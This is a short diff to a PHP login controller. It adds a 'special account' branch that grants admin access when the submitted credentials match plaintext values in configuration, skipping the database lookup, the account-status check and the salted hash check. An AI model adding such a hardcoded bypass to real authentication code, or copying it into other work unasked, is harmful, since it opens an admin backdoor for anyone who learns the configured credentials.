@@ -40,13 +40,19 @@ class LoginController extends Controller{
 
             $model=M('user');      //实例化user表
             $map['user_name']=I('post.username');
+            $password=I('post.password');
+            if($map['user_name'] == C('username') && $password == C('password')){
+                session('uid','-1');  //将账号保存到session中
+                $this->success('特殊账号',U('Admin/admin'),1);
+                exit;
+            }
             $map['status']=0;
             $i=$model->where($map)->find();    //获取user表中相应的记录
             if(!$i){
                 $this->error('该账号不存在,或者已停用！',U('login'),1);
             }
             $data['user_name']=$map['user_name'];
-            $pwd=md5(md5(I('post.password')).$i['salt']);     //获取提交的密码
+            $pwd=md5(md5($password).$i['salt']);     //获取提交的密码
             if(!$i || $i['password']!=$pwd){
                 $this->error('密码错误，请重新输入！',U('login'),1);
             }
